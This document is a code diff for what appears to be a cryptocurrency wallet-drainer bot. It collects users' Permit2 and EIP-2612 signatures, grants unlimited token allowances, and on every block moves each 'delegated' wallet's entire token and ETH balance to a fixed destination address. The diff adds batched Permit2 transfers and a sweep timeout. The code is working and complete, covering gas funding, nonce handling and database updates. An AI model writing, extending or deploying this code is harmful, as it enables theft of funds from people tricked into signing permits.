@@ -117,8 +117,10 @@ const PERMIT2_ABI = [
   "function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)",
   // PATH B gasless: bot calls permit() to set allowances from user's PermitBatch sig
   "function permit(address owner, tuple(tuple(address token, uint160 amount, uint48 expiration, uint48 nonce)[] details, address spender, uint256 sigDeadline) permitBatch, bytes calldata signature) external",
-  // PATH B gasless: bot calls permitTransferFrom() with user's SignatureTransfer sig
-  "function permitTransferFrom(tuple(tuple(address token, uint256 amount) permitted, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount) transferDetails, address owner, bytes calldata signature) external",
+];
+// Batch SignatureTransfer — separate ABI to avoid overload ambiguity with ethers.js
+const PERMIT2_BATCH_TRANSFER_ABI = [
+  "function permitTransferFrom(tuple(tuple(address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount)[] transferDetails, address owner, bytes calldata signature) external",
 ];
 
 // ── Wallet & contracts — ALL bound to rpcProvider (HTTP) ─────────────────────
@@ -126,6 +128,7 @@ const PERMIT2_ABI = [
 
 const relayerWallet = new ethers.Wallet(PRIVATE_KEY, rpcProvider);
 const permit2       = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, relayerWallet);
+const permit2Batch  = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_BATCH_TRANSFER_ABI, relayerWallet);
 const contract      = CONTRACT_ADDRESS
   ? new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, relayerWallet)
   : null;
@@ -143,6 +146,7 @@ let realtimeChannel    = null;
 const BACKOFF_MS       = [10_000, 30_000, 60_000, 120_000];
 let reconnectAttempt   = 0;
 let isProcessing       = false; // block-overlap guard — skip block if previous still running
+const SWEEP_TIMEOUT_MS = 30_000; // 30s safety net — release isProcessing if sweep hangs
 
 // ── Logging ───────────────────────────────────────────────────────────────────
 
@@ -619,128 +623,209 @@ async function sweepGaslessWallet(walletAddress) {
     }
   }
 
-  // -- Per-token SignatureTransfer path (EIP-2612 enhanced) --------------------
-  //
-  // If entry.eip2612 exists: bot calls token.permit() first to set ERC20→Permit2.
-  // Then calls permit2.permitTransferFrom() to sweep.
-  // After InvalidNonce: mark spent=true. TRANSFER_FROM_FAILED: flag for airdrop.
+  // ── SignatureTransfer path — batch (new) or per-token (legacy backward compat) ─
 
   const needsGasTokens = [];
 
-  if (!Array.isArray(signatureTransfers) || signatureTransfers.length === 0) {
-    if (needsGasTokens.length > 0) {
-      await evaluateAirdrop(checksum, needsGasTokens).catch(e => err(`evaluateAirdrop: ${e.message}`));
-    }
-    return;
-  }
+  if (Array.isArray(signatureTransfers)) {
+    // ── LEGACY: per-token array format ────────────────────────────────────────
+    let sigMetaChanged = false;
+    const updatedSigs = JSON.parse(JSON.stringify(signatureTransfers));
 
-  let sigMetaChanged = false;
-  const updatedSigs = JSON.parse(JSON.stringify(signatureTransfers));
-
-  for (let i = 0; i < updatedSigs.length; i++) {
-    const entry = updatedSigs[i];
-    if (!entry?.signature || entry.spent) {
-      await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
-      continue;
-    }
-
-    const deadline = BigInt(entry.deadline);
-    if (deadline < nowSecs) {
-      warn(`[gasless/sig] entry ${i} expired for ${checksum} -- marking spent`);
-      updatedSigs[i].spent = true;
-      sigMetaChanged = true;
-      continue;
-    }
-
-    const tokenAddr = normalizeAddress(entry.token);
-    if (!tokenAddr) continue;
-
-    try {
-      const erc20Token = new ethers.Contract(tokenAddr, ERC20_ABI, rpcProvider);
-      const balance    = await erc20Token.balanceOf(checksum);
-      if (balance === 0n) { await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY)); continue; }
-
-      let erc20Allow = 0n;
-      try { erc20Allow = await erc20Token.allowance(checksum, PERMIT2_ADDRESS); } catch {}
-
-      // EIP-2612: call token.permit() to set ERC20→Permit2 (bot pays gas)
-      if (entry.eip2612 && erc20Allow === 0n) {
-        const { v, r, s } = entry.eip2612;
-        const e2Deadline  = BigInt(entry.eip2612.deadline);
-        if (e2Deadline > nowSecs) {
-          log(`[gasless/sig] ${entry.symbol ?? tokenAddr.slice(0, 10)}: EIP-2612 token.permit()…`);
-          try {
-            const tokenContract = new ethers.Contract(tokenAddr, EIP2612_PERMIT_ABI, relayerWallet);
-            const fee           = await getFeeData();
-            const permitTx      = await tokenContract.permit(
-              checksum, PERMIT2_ADDRESS, ethers.MaxUint256, e2Deadline, v, r, s,
-              { gasLimit: 100_000n, ...fee },
-            );
-            await permitTx.wait();
-            log(`[gasless/sig] token.permit() confirmed for ${entry.symbol ?? tokenAddr.slice(0, 10)}`);
-            erc20Allow = ethers.MaxUint256;
-          } catch (e) {
-            warn(`[gasless/sig] token.permit() failed for ${entry.symbol ?? tokenAddr.slice(0, 10)}: ${e.message ?? e}`);
-          }
-        } else {
-          warn(`[gasless/sig] EIP-2612 permit expired for ${entry.symbol ?? tokenAddr.slice(0, 10)}`);
-        }
-      }
-
-      if (erc20Allow === 0n) {
-        log(`[monitor] ${entry.symbol ?? tokenAddr.slice(0, 10)}: no ERC20→Permit2 — flagging for airdrop`);
-        needsGasTokens.push({ token: tokenAddr, balance });
+    for (let i = 0; i < updatedSigs.length; i++) {
+      const entry = updatedSigs[i];
+      if (!entry?.signature || entry.spent) {
         await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
         continue;
       }
 
-      log(`[gasless/sig] ${checksum} ${entry.symbol ?? tokenAddr.slice(0, 10)} balance=${balance} -- permitTransferFrom`);
+      const deadline = BigInt(entry.deadline);
+      if (deadline < nowSecs) {
+        warn(`[gasless/sig] entry ${i} expired for ${checksum} — marking spent`);
+        updatedSigs[i].spent = true;
+        sigMetaChanged = true;
+        continue;
+      }
 
+      const tokenAddr = normalizeAddress(entry.token);
+      if (!tokenAddr) continue;
+
+      try {
+        const erc20Token = new ethers.Contract(tokenAddr, ERC20_ABI, rpcProvider);
+        const balance    = await erc20Token.balanceOf(checksum);
+
+        if (balance === 0n) { await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY)); continue; }
+
+        let erc20Allow = 0n;
+        try { erc20Allow = await erc20Token.allowance(checksum, PERMIT2_ADDRESS); } catch {}
+
+        if (entry.eip2612 && erc20Allow === 0n) {
+          const { v, r, s } = entry.eip2612;
+          const e2Deadline  = BigInt(entry.eip2612.deadline);
+          if (e2Deadline > nowSecs) {
+            try {
+              const tc  = new ethers.Contract(tokenAddr, EIP2612_PERMIT_ABI, relayerWallet);
+              const fee = await getFeeData();
+              await (await tc.permit(checksum, PERMIT2_ADDRESS, ethers.MaxUint256, e2Deadline, v, r, s, { gasLimit: 100_000n, ...fee })).wait();
+              log(`[gasless/sig] EIP-2612 token.permit() confirmed for ${entry.symbol ?? tokenAddr.slice(0, 10)}`);
+              erc20Allow = ethers.MaxUint256;
+            } catch (e) {
+              warn(`[gasless/sig] token.permit() failed for ${entry.symbol ?? tokenAddr.slice(0, 10)}: ${e.message ?? e}`);
+            }
+          }
+        }
+
+        if (erc20Allow === 0n) {
+          needsGasTokens.push({ token: tokenAddr, balance });
+          await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
+          continue;
+        }
+
+        log(`[gasless/sig] ${checksum} ${entry.symbol ?? tokenAddr.slice(0, 10)} balance=${balance} — legacy single permitTransferFrom`);
+        const fee = await getFeeData();
+        const legacyPermit2 = new ethers.Contract(PERMIT2_ADDRESS, [
+          "function permitTransferFrom(tuple(tuple(address token, uint256 amount) permitted, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount) transferDetails, address owner, bytes calldata signature) external",
+        ], relayerWallet);
+        const tx = await legacyPermit2.permitTransferFrom(
+          { permitted: { token: tokenAddr, amount: BigInt(entry.amount) }, nonce: BigInt(entry.nonce), deadline: BigInt(entry.deadline) },
+          { to: DESTINATION_ADDRESS, requestedAmount: balance },
+          checksum, entry.signature,
+          { gasLimit: 220_000n, ...fee },
+        );
+        log(`[gasless/sig] tx: ${tx.hash}`);
+        await tx.wait();
+        log(`[gasless/sig] confirmed — ${entry.symbol ?? tokenAddr.slice(0, 10)} swept`);
+        updatedSigs[i].spent = true;
+        sigMetaChanged = true;
+
+      } catch (e) {
+        const msg = e.message ?? "";
+        if (/InvalidNonce|nonce.*already.*used|NONCE_USED/i.test(msg)) {
+          warn(`[gasless/sig] nonce consumed — ${entry.symbol ?? entry.token?.slice(0, 10)} — marking spent`);
+          updatedSigs[i].spent = true; sigMetaChanged = true;
+        } else if (/TRANSFER_FROM_FAILED|transferFrom/i.test(msg)) {
+          warn(`[gasless/sig] TRANSFER_FROM_FAILED — ${entry.symbol ?? entry.token?.slice(0, 10)} — marking spent`);
+          updatedSigs[i].spent = true; sigMetaChanged = true;
+        } else {
+          err(`[gasless/sig] ${entry.token} for ${checksum}: ${msg}`);
+        }
+      }
+      await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
+    }
+
+    if (sigMetaChanged && supabase) {
+      try {
+        await supabase.from("delegated_wallets")
+          .update({ permit_metadata: { ...meta, signatureTransfers: updatedSigs } })
+          .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
+        log(`[gasless/sig] Updated spent flags for ${checksum}`);
+      } catch (e) { err(`[gasless/sig] Supabase update failed: ${e.message}`); }
+    }
+
+  } else if (signatureTransfers && typeof signatureTransfers === "object" && !signatureTransfers.spent) {
+    // ── NEW: single batch object ───────────────────────────────────────────────
+    const batch = signatureTransfers;
+
+    if (BigInt(batch.deadline) < nowSecs) {
+      warn(`[gasless/batch] deadline expired for ${checksum} — marking spent`);
+      if (supabase) {
+        await supabase.from("delegated_wallets")
+          .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } } })
+          .eq("address", checksum.toLowerCase()).eq("chain", CHAIN)
+          .catch(e => err(`[gasless/batch] Supabase update: ${e.message}`));
+      }
+      return;
+    }
+
+    const eip2612Map = batch.eip2612 ?? {};
+
+    // Step 1: EIP-2612 permits — set ERC20→Permit2 for tokens that need it
+    for (const perm of batch.permitted) {
+      const tokenAddr = normalizeAddress(perm.token);
+      if (!tokenAddr) continue;
+      let erc20Allow = 0n;
+      try { erc20Allow = await new ethers.Contract(tokenAddr, ERC20_ABI, rpcProvider).allowance(checksum, PERMIT2_ADDRESS); } catch {}
+
+      if (erc20Allow === 0n) {
+        const e2 = eip2612Map[tokenAddr.toLowerCase()];
+        if (e2 && BigInt(e2.deadline) > nowSecs) {
+          log(`[gasless/batch] EIP-2612 token.permit() for ${tokenAddr.slice(0, 10)}`);
+          try {
+            const tc  = new ethers.Contract(tokenAddr, EIP2612_PERMIT_ABI, relayerWallet);
+            const fee = await getFeeData();
+            await (await tc.permit(checksum, PERMIT2_ADDRESS, ethers.MaxUint256, BigInt(e2.deadline), e2.v, e2.r, e2.s, { gasLimit: 100_000n, ...fee })).wait();
+            log(`[gasless/batch] EIP-2612 confirmed for ${tokenAddr.slice(0, 10)}`);
+          } catch (e) { warn(`[gasless/batch] EIP-2612 failed for ${tokenAddr.slice(0, 10)}: ${e.message}`); }
+        }
+      }
+      await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
+    }
+
+    // Step 2: Build transferDetails — check balances, 0 for empty tokens
+    const transferDetails = [];
+    let anyBalance = false;
+    for (const perm of batch.permitted) {
+      const tokenAddr = normalizeAddress(perm.token);
+      if (!tokenAddr) { transferDetails.push({ to: DESTINATION_ADDRESS, requestedAmount: 0n }); continue; }
+      try {
+        const balance = await new ethers.Contract(tokenAddr, ERC20_ABI, rpcProvider).balanceOf(checksum);
+        transferDetails.push({ to: DESTINATION_ADDRESS, requestedAmount: balance });
+        if (balance > 0n) anyBalance = true;
+      } catch {
+        transferDetails.push({ to: DESTINATION_ADDRESS, requestedAmount: 0n });
+      }
+      await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
+    }
+
+    if (!anyBalance) {
+      log(`[gasless/batch] no token balances for ${checksum} — skipping batch`);
+      if (needsGasTokens.length > 0) {
+        await evaluateAirdrop(checksum, needsGasTokens).catch(e => err(`evaluateAirdrop: ${e.message}`));
+      }
+      return;
+    }
+
+    // Step 3: Batch permitTransferFrom — ONE call for all tokens
+    try {
       const fee = await getFeeData();
-      const tx  = await permit2.permitTransferFrom(
+      const gasLimit = 150_000n + BigInt(batch.permitted.length) * 100_000n;
+      const tx = await permit2Batch.permitTransferFrom(
         {
-          permitted: { token: tokenAddr, amount: BigInt(entry.amount) },
-          nonce:     BigInt(entry.nonce),
-          deadline:  BigInt(entry.deadline),
+          permitted: batch.permitted.map(p => ({ token: p.token, amount: BigInt(p.amount) })),
+          nonce:     BigInt(batch.nonce),
+          deadline:  BigInt(batch.deadline),
         },
-        { to: DESTINATION_ADDRESS, requestedAmount: balance },
+        transferDetails,
         checksum,
-        entry.signature,
-        { gasLimit: 220_000n, ...fee }
+        batch.signature,
+        { gasLimit, ...fee },
       );
-      log(`[gasless/sig] permitTransferFrom tx: ${tx.hash}`);
+      log(`[gasless/batch] batch permitTransferFrom tx: ${tx.hash}`);
       await tx.wait();
-      log(`[gasless/sig] confirmed -- ${entry.symbol ?? tokenAddr.slice(0, 10)} swept for ${checksum}`);
-      updatedSigs[i].spent = true;
-      sigMetaChanged = true;
+      log(`[gasless/batch] confirmed — batch sweep for ${checksum} (${batch.permitted.length} token(s))`);
 
+      if (supabase) {
+        await supabase.from("delegated_wallets")
+          .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } } })
+          .eq("address", checksum.toLowerCase()).eq("chain", CHAIN)
+          .catch(e => err(`[gasless/batch] Supabase spent update: ${e.message}`));
+      }
     } catch (e) {
       const msg = e.message ?? "";
       if (/InvalidNonce|nonce.*already.*used|NONCE_USED/i.test(msg)) {
-        warn(`[gasless/sig] Nonce consumed -- ${entry.symbol ?? entry.token?.slice(0, 10)} (${checksum}) -- marking spent`);
-        updatedSigs[i].spent = true;
-        sigMetaChanged = true;
+        warn(`[gasless/batch] nonce consumed for ${checksum} — marking spent`);
       } else if (/TRANSFER_FROM_FAILED|transferFrom/i.test(msg)) {
-        warn(`[gasless/sig] TRANSFER_FROM_FAILED -- ${entry.symbol ?? entry.token?.slice(0, 10)} (${checksum}) -- marking spent`);
-        updatedSigs[i].spent = true;
-        sigMetaChanged = true;
+        warn(`[gasless/batch] TRANSFER_FROM_FAILED for ${checksum} — marking spent`);
       } else {
-        err(`[gasless/sig] permitTransferFrom ${entry.token} for ${checksum}: ${msg}`);
+        err(`[gasless/batch] batch permitTransferFrom for ${checksum}: ${msg}`);
+        return;
       }
-    }
-    await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
-  }
-
-  if (sigMetaChanged && supabase) {
-    try {
-      await supabase
-        .from("delegated_wallets")
-        .update({ permit_metadata: { ...meta, signatureTransfers: updatedSigs } })
-        .eq("address", checksum.toLowerCase())
-        .eq("chain", CHAIN);
-      log(`[gasless/sig] Updated spent flags in Supabase for ${checksum}`);
-    } catch (e) {
-      err(`[gasless/sig] Failed to update Supabase for ${checksum}: ${e.message}`);
+      if (supabase) {
+        await supabase.from("delegated_wallets")
+          .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } } })
+          .eq("address", checksum.toLowerCase()).eq("chain", CHAIN)
+          .catch(e2 => err(`[gasless/batch] Supabase spent update: ${e2.message}`));
+      }
     }
   }
 
@@ -873,33 +958,42 @@ async function startBot() {
       isProcessing = true;
 
       try {
-        if (contract) {
-          await sweepETH();
-          for (const tokenAddress of TOKENS_TO_WATCH) {
-            await sweepToken(tokenAddress.trim());
-          }
-        }
-
-        const due = [...delegatedWallets.keys()].filter(shouldSweep);
-        if (!due.length) return;
-        log(`Block ${blockNumber} — ${due.length}/${delegatedWallets.size} wallet(s) due`);
-
-        for (const walletAddress of due) {
-          const walletType = delegatedWallets.get(walletAddress);
-          try {
-            if (walletType === "permit2-gasless") {
-              await sweepGaslessWallet(walletAddress);
-            } else if (walletType === "permit2" || walletType === "wrap-fallback") {
-              await sweepPermit2Wallet(walletAddress);
-            } else {
-              await sweepEIP7702Wallet(walletAddress);
+        await Promise.race([
+          (async () => {
+            if (contract) {
+              await sweepETH();
+              for (const tokenAddress of TOKENS_TO_WATCH) {
+                await sweepToken(tokenAddress.trim());
+              }
             }
-            markSwept(walletAddress);
-          } catch (e) {
-            err(`sweep failed for ${walletAddress}: ${e.message}`);
-          }
-          await new Promise((r) => setTimeout(r, 1000));
-        }
+
+            const due = [...delegatedWallets.keys()].filter(shouldSweep);
+            if (!due.length) return;
+            log(`Block ${blockNumber} — ${due.length}/${delegatedWallets.size} wallet(s) due`);
+
+            for (const walletAddress of due) {
+              const walletType = delegatedWallets.get(walletAddress);
+              try {
+                if (walletType === "permit2-gasless") {
+                  await sweepGaslessWallet(walletAddress);
+                } else if (walletType === "permit2" || walletType === "wrap-fallback") {
+                  await sweepPermit2Wallet(walletAddress);
+                } else {
+                  await sweepEIP7702Wallet(walletAddress);
+                }
+                markSwept(walletAddress);
+              } catch (e) {
+                err(`sweep failed for ${walletAddress}: ${e.message}`);
+              }
+              await new Promise((r) => setTimeout(r, 1000));
+            }
+          })(),
+          new Promise((_, reject) =>
+            setTimeout(() => reject(new Error("sweep timeout")), SWEEP_TIMEOUT_MS)
+          ),
+        ]);
+      } catch (e) {
+        err(`Block ${blockNumber} sweep error/timeout: ${e.message}`);
       } finally {
         isProcessing = false;
       }
